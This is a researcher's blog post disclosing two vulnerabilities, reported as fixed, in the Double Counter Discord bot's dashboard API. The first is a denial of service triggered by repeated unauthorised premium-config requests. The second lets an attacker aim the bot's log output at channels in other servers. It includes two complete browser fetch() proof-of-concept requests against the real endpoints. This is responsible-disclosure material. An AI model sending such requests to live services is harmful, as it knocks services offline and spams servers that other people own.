+++
title = 'Log Anywhere & Simple DOS - Double Counter Vulnerabilities'
date = 2025-08-19T21:54:28Z
draft = false
+++

# Log Anywhere & Simple DOS - Double Counter Vulnerabilities

Before I start, I'll provide some context: Double Counter is an anti-alt bot for the messaging app Discord, where users can verify themselves through their service, and server owners can configure and set up Double Counter for their server. It is frequently given full administrator access, meaning it has a ton of trust by default; this is bad when the bot is influenced by an attacker. It runs on a parent company (which the owner of Double Counter also owns), Tellter, and the Double Counter APIs are on their servers.

## TL;DR:

While the service enforces strict checks on the Discord server ID that configurations apply to when changing settings, they had essentially nonexistent checks on everything else. This let me set the log channel IDs (which are unique, and if not enforced by the Discord bot, is about the same as applying configurations for a different server) for a different channel in another server that the DC bot is in. From there, you can just verify, and logs go to the other channel. It's not a crazy vulnerability, but it’s more common than one might think in other bots.

Also, there was a DOS vulnerability where the server errored when you tried to make premium configuration requests when you didn't own a server with premium; 5 or 10 of those could crash the Dyno (what Heroku calls their containers) for Tellter.

## Doxr's Severeness Rating:

End Users affected: [Easily over a million](https://doublecounter.gg/), 500k servers using DC with multiple people, probably.

Doxr's Rating: 6.5/10

Why: The DOS makes the dashboard/configuations impossible (backend service down) and distributed logging spam could be introduced, especially when botting is taken advantage of.

## Why I started

I really like pentesting Discord Bots, specifically bots made for server management, because: 

1. They were made by normal people instead of corporations
2. Are often WAY overprivilaged, usually with admin permissions for convenience of the developer
3. Usually have an external management and configuration dashboard, which you can pentest easily

DC is one of those bots that requests administrator permissions by default (but to be fair, even if it didn’t, it would need a lot of the high privilege, abusable permissions), and has had prior vulnerabilities with writeups that are now fixed. One vulnerability, specifically, is IDOR relating to changing the server ID when configuring, which is why all requests had a strict check on the server ID.

## DOS Vulnerability

The way I found the DOS vulnerability was pretty simple. I wanted to check if premium configuration locks (which are behind a paywall) are client-side only, so I removed the overlay that prevented me from using the premium configurations UI. From there, I tried changing something, saving, and I saw that I didn't get a 403 error, like I expected. Instead of rejecting the request and handling the issue gracefully, the request spent an abnormally long time resolving, and gave me a 500 (server error) instead.

I thought I could trick it into letting me set premium configs through a race-condition-type attack, so I just sent a bunch of the same request (the one that caused a 500) like 5 or 10 times, and to my surprise, the Dyno died and I was met with a Heroku error page. This meant I could take down the dashboard API globally and stop anyone from configuring DC settings (an act of true evil 👻), with a single machine and only a couple requests.

## Log Anywhere

This one is cooler than the DOS, in my opinion.

![picture of random logs in a read-only welcome channel](../../interstellar-logs.png)

This is a screenshot of Double Counter spitting random internal logs when I verified in my test server, to a read-only welcome channel in a server that someone else owns and has Double Counter on.

I already explained how it worked in the TL;DR, but the true vulnerability here is that the scope of the channel IDs wasn't limited to the server, it was global. However, it's really just one simple fix, and this doesn't really matter in the grand scheme of everything DC, but it still isn't a good idea to let anyone be able to make any channel on a DC server (including the official server and 500k+ other servers) a logging channel, which is kind of spammy.

## Reporting

This was an interesting report, because I worked directly with the owner to get it fixed, and got a cash reward for it. After sending weird logs to the official server, the DC owner and some other mods got involved, and we got it fixed the very same day (also mixed with a little bit of trolling the mods). However, the owner was really reactive, and gave us a reward for the vulnerability, saying: 

> It's normal, that's how you treat people who help instead of destroying things 😄
> It should be the norm everywhere

Which I would say is pretty cool. AND to add onto that, DC gave us free premium on the testing server I used to try to escalate the vuln (I couldn't), which was pretty nice.

## PoCs:

These PoCs are pretty simple and run on the browser; you just need to log into the Double Counter dashboard for the auth header:

DOS Script (used to DOS by running like 5 or 10 times):

```
fetch("https://integrations.tellter.com/dashboard/premium_info", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "authorization": "Bearer ***", // replace auth here
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://dashboard.doublecounter.gg/***/premium",
  "referrerPolicy": "unsafe-url",
  "body": "{\"custom\":\"hello!\",\"serverId\":\"[your server ID]\"}",
  "method": "PATCH",
  "mode": "cors",
  "credentials": "include"
});
```

Log Anywhere Script:

```
fetch("https://integrations.tellter.com/dashboard/server_settings", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "authorization": "Bearer ***",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://dashboard.doublecounter.gg/1321684596517244939/preferences",
  "referrerPolicy": "unsafe-url",
  "body": "{\"verification_channel\":\"[target channel]\",\"verification_role\":\"[configure a real verification role in your server here]\",\"log_channel\":\"[target channel]\",\"serverId\":\"[attacker DC server]\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

## Conclusion

Finding vulns in Discord bots is an untapped market; the trolling potential is insane, and in some cases, it's easy to pentest too. Also, software owners should aspire to be like the DC owner, who treats reports like help instead of a threat.

- doxr